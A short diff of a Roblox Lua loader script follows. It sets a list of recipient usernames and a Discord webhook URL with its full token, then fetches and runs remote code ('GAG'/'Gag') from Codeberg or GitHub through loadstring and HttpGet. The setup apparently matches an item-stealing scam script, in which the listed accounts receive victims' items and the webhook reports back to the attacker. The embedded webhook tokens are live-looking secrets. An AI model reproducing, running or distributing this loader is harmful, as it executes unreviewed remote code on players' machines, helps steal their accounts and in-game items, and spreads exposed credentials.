@@ -1,5 +1,5 @@
 
-getgenv().Usernames = {"memastermajd111", "User2"}
-getgenv().Webhook = "https://discord.com/api/webhooks/1374205015123558542/iDSLjdaZK-JtNg4w7tl5aZzlkFx3W5m07igqRIRcCkdE0Pb-Dnh1P_h1TONpzmEiSGRP"
+getgenv().Username = {"memastermajd111", "user2", "user3"}
+getgenv().Webhook = "https://discord.com/api/webhooks/1374017697612042260/1V6CLUTvpQllPHazEiitdQbzN5CzgzLgSiLbK6uijMtCVjDltt111cbmE-pXBpaDywJY"
 
-loadstring(game:HttpGet("https://codeberg.org/aevithegreat/TideScripts/raw/branch/main/GAG.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/namnnni2/Member/refs/heads/main/Gag"))()
